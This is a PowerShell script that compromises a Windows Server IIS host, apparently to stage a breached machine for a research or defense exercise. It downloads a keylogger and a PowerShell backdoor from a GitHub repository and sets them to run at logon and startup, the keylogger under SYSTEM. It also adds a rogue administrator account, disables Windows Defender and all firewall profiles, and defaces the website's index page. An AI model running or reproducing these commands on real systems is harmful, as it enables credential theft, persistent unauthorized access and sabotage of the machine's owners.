
# install python and python keylogger
Invoke-WebRequest https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe -OutFile python-installer.exe
Start-Process python-installer.exe -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
pip install pynput
curl "https://github.com/cleverbear57/AI-Research-Project/raw/refs/heads/main/Windows%20Server%202022%20IIS/klogger.py" -OutFile "C:/Windows/System32/config/klogger.pyw"
Register-ScheduledTask -TaskName "PyBgTask" `
-Action (New-ScheduledTaskAction -Execute "C:\Program Files\Python312\pythonw.exe" -Argument "C:\Windows\System32\config\klogger.pyw") `
-Trigger (New-ScheduledTaskTrigger -AtLogOn) `
-Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest) `
-Force

# add malicious user
net user john "password" /add
Add-LocalGroupMember -Group "Administrators" -Member "john"

# download powershell backdoor to startup folder
curl "https://raw.githubusercontent.com/cleverbear57/AI-Research-Project/refs/heads/main/Windows%20Server%202022%20IIS/shl.ps1" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shl.ps1"

# disable windows defender and real-time protection
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord

# disable all firewall profiles
Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False

# install silver beacon

# deface website
echo "YOU HAVE BEEN HACKED!!!" > "C:\inetpub\wwwroot\index.php"


